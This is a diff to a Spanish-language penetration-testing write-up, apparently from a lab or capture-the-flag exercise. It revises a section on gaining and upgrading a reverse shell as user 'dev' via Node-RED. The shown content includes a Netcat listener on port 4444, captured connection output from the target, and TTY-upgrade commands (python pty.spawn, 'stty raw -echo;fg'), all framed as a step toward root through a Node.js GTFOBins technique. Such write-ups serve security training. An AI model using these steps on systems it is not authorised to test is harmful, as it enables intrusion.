@@ -137,16 +137,12 @@ Permitiendo ingresar al usuario dev, del cual no se posee la contraseña.
 ![](Evidencias_Visuales/inyección_NODE-RED)
 
 
-### Inyección mediante NODE-RED
-```bash
-┌──(kali㉿kali)-[~]
-└─$ nc -lvnp 4444
-listening on [any] 4444 ...
-connect to [192.168.128.160] from (UNKNOWN) [10.128.154.75] 46936
-bash: no se puede establecer el grupo de proceso de terminal (337): Función ioctl no apropiada para el dispositivo
-bash: no hay control de trabajos en este shell
-dev@tnightmarebc:~$ 
-```
+### Escalada de privilegios a root
+
+#### Opción #1: GFTOBins y shell inversa
+Mediante el uso de GFTOBins encontramos un comando que permite usar Node.js para abrir una shell del sistema y que esta establezca conexión a la terminal del atacante. De la siguiente manera: 
+
+Se obtuvo una reverse shell mediante Netcat, estableciendo conexión desde el sistema objetivo hacia el atacante. Pero esta shell no tiene la capacidad de ejecutar comandos.
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 4444
@@ -154,11 +150,18 @@ listening on [any] 4444 ...
 connect to [192.168.128.160] from (UNKNOWN) [10.130.173.137] 37516
 bash: no se puede establecer el grupo de proceso de terminal (307): Función ioctl no apropiada para el dispositivo
 bash: no hay control de trabajos en este shell
+```
+
+Por esto hacemos un "TTY spawn", también llamado "pseudo-terminal upgrade" para mejorar la shell, permitir control de procesos y preparar una interacción normal.
+```bash
 dev@tnightmarebc:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 dev@tnightmarebc:~$ ^Z
 zsh: suspended  nc -lvnp 4444
-                                                                                                        
+```
+
+Volvemos a mejorar la terminal usando un "stty raw mode fix" (stty raw -echo;fg) y un "terminal emulation setup" (export TERM=xterm), para posteriormente ejecutar el comando, lo que nos da acceso completo a root y por ende a todo el sistema.
+```bash                                                                                                    
 ┌──(kali㉿kali)-[~]
 └─$ stty raw -echo;fg       
 [2]  - continued  nc -lvnp 4444
